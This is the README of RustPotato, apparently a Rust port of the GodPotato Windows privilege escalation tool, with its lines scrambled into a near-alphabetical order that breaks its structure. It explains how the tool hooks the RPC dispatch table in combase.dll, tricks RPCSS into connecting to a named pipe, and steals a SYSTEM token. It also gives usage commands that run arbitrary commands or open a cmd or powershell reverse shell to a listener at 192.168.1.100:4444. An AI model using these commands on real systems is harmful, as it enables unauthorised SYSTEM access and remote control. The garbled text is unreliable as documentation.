
                     Specify the shell to be used in the reverse shell (optional, default is cmd).
    RustPotato.exe "cmd.exe /c whoami"
    RustPotato.exe -h 192.168.1.100 -p 4444
    RustPotato.exe -h 192.168.1.100 -p 4444 -c powershell
   RustPotato replaces the first entry in the `RPC_DISPATCH_TABLE` with a custom function pointer, enabling interception and manipulation of specific RPC calls.
   The tool scans the memory of `combase.dll` to find the `RPC_SERVER_INTERFACE` structure, a critical component for managing RPC communications through the OXID Resolver.
  -c <cmd|powershell>
  -h <LHOST>         Specify the IP address of the listener for the reverse shell.
  -p <LPORT>         Specify the port of the listener for the reverse shell.
  A named pipe (e.g., `\\.\pipe\RustPotato`) is created with unrestricted access, serving as the endpoint for client connections.
  During impersonation, RustPotato locates and duplicates a token associated with the `NT AUTHORITY\SYSTEM` account.
  Execute a command line or start a reverse shell.
  Execute a command line:
  Removes the custom function pointer from the `RPC_DISPATCH_TABLE` and restores the original state in `combase.dll`.
  RustPotato crafts and unmarshals a COM object, compelling **RPCSS** to establish a connection with the named pipe.
  RustPotato features a TCP-based reverse shell based on [Rustic64Shell](https://github.com/safedv/Rustic64Shell). It leverages Winsock APIs for network communication and indirect NT APIs for pipe-based I/O redirection, enabling command execution through `cmd` or `powershell`.
  RustPotato leverages indirect NTAPI calls for various operations, including token handling and manipulation.
  RustPotato uses the duplicated token to execute a specified command, leveraging `CreateProcessWithTokenW`.
  RustPotato.exe [command line] | [options]
  Start a reverse shell with powershell:
  Start a reverse shell with the default shell (cmd):
  Stops the named pipe server, releasing all associated resources and handles.
  The unmarshalled object invokes RPC calls that traverse the hooked dispatch table, allowing RustPotato to intercept and manipulate the interactions.
  When **RPCSS** connects to the named pipe, RustPotato impersonates the client using `ImpersonateNamedPipeClient` to assume its security context.
  With reverse shell options (`-h` and `-p`), RustPotato connects to a listener and executes commands through `cmd` or `powershell`.
  ```
  ```bash
  cargo build --release
  cargo build --release --features verbose
# RustPotato
## Credits
## Disclaimer
## Key Features
## Overview
## Usage
### 1. **Initialize and Hook RPC Context**
### 2. **Start Named Pipe Server and Trigger RPCSS**
### 3. **Execute Command or Establish Reverse Shell**
### 4. **Restore State and Cleanup**
### Build Options
### Help
**RustPotato** is a Rust-based implementation of [GodPotato](https://github.com/BeichenDream/GodPotato), a privilege escalation tool that abuses **DCOM** and **RPC** to leverage **SeImpersonatePrivilege** and gain `NT AUTHORITY\SYSTEM` privileges on Windows systems.
- **Basic build** (only the process output is printed):
- **Build with verbose logging**:
- **Create Named Pipe**:  
- **Establish a Reverse Shell**:  
- **Execute a Command**:  
- **Impersonate Client**:  
- **Indirect NTAPI**:  
- **Restore RPC Dispatch Table**:  
- **Retrieve SYSTEM Token**:  
- **TCP-based Reverse Shell**:  
- **Terminate Pipe Server**:  
- **Trigger RPCSS**:  
- **Unmarshal COM Object**:  
- **`verbose`**: Enables detailed logging during execution.
- [BeichenDream](https://github.com/BeichenDream) for his work on [GodPotato](https://github.com/BeichenDream/GodPotato), which made this port possible!
- [Resolving System Service Numbers Using The Exception Directory by MDsec](https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/) for their insights on resolving SSNs.
---
1. **Locate `RPC_SERVER_INTERFACE` Structure**:  
2. **Hook RPC Dispatch Table**:  
> **Note:** RustPotato supports only x86_64 targets (MSVC or GNU).
Always respect ethical guidelines and adhere to legal frameworks while conducting security research (or, honestly, in everything you do).
Below is an overview of its execution flow, highlighting key operations at each step:
Description:
Examples:
Options:
RustPotato provides the following features:
Special thanks to:
The named pipe server plays a central role in impersonation and privilege escalation:
Usage:
```
```text
